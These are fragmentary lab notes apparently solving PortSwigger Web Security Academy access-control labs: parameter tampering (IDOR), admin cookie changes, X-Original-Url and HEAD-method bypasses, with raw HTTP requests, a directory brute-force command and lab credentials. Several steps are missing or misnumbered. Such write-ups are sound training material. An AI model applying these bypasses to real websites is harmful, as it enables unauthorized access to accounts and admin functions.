```sh
feroxbuster -u https://...<SNIP>....web-security-academy.net/ -w /opt/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --silent -n
```

3. Change `Admin` cookie to `TRUE`
4. Access `/admin` > Delete Carlos
# User role can be modified in user profile

5. Access `/admin` > Delete Carlos
# User ID controlled by request parameter
1. Login with credentials `wiener:peter`
2. Account page references username as an `id` parameter in the URL

```
3. Change `id` parameter to `administrator`
```
/my-account?id=administrator
```
3. Obtain Administrator's API key
# User ID controlled by request parameter, with unpredictable user IDs
1. Login with credentials `wiener:peter`
2. Account page references username as an `id` parameter using a `uuid`
```
/my-account?id=b8d3e905-d7f0-4de2-8919-8852dd334e7f
```
3. Navigate blog posts and see the author's names have links
4. Inspecting HTML source discloses the `uuid` value of authors
5. Copy Carlos `uuid` and make request to view their account
```
/my-account?id=f1034152-2abd-40e5-aab2-da98672598f3
```
# User ID controlled by request parameter with data leakage in redirect
1. Login with credentials `wiener:peter`
2. Account page references username as an `id` parameter
```
/my-account?id=wiener
```
- Account page discloses user's API key
3. Send request to repeater and change `wiener` to `carlos`
```
/my-account?id=carlos
```
4. We receive a `302 Found` but the HTTP response discloses `carlos` API key
# User ID controlled by request parameter with password disclosure
1. Login with credentials `wiener:peter`
2. Account page references username as an `id` parameter
```
/my-account?id=wiener
```
- Account page has a password change feature which is automatically populated with the user's password
	- Audit the HTTP response and see the user's password included in the HTTP response

4. Capture `GET` request showing transcript contents and send to repeater
5. Change `2.txt` to `1.txt` and retrieve another user's chat transcript
6. Retrieve password and sign in
# URL-based access control can be circumvented
1. Capture request to web root `/` in burp and send to repeater
2. Test if `X-Original-Url` header is supported by directing to a resource that does not exist
```
GET / HTTP/2
Host: 0ad300ad04c9d0528011305500b200b6.web-security-academy.net
X-Original-Url: /does_not_exist
```
- `404 not found` returned indicates this header is supported
3. Using the same request, change the URL to the restricted resource `/admin`
```
GET / HTTP/2
Host: 0ad300ad04c9d0528011305500b200b6.web-security-academy.net
X-Original-Url: /admin
```
4. We get `200 OK` and can see the HTTP response of the `/admin` page

Host: 0ad300ad04c9d0528011305500b200b6.web-security-academy.net
X-Original-Url: /admin/delete

...<SNIP>...
username=carlos
```
# Method-based access control can be circumvented
1. Login to admin panel `administrator:admin` 
2. Capture requests to upgrade/downgrade `wiener`
3. Logout and login with `wiener:peter` to get their session token
4. Replaying request to upgrade `wiener` returns `401`
```
POST /admin-roles HTTP/2
Host: 0a0800b50405c5e180e377c9004e0017.web-security-academy.net
Cookie: session=MdZyuo0BvLeGDc9b3mRDOjwcu3eauTYS

username=wiener&action=downgrade
```
5. Change request method to `HEAD` and place the parameters in the URL
```
HEAD /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0a0800b50405c5e180e377c9004e0017.web-security-academy.net

```
6. Account is now upgraded
# Multi-step process with no access control on one step
1. Login to admin panel `administrator:admin`

# Referer-based access control
1. Login to admin panel `administrator:admin`
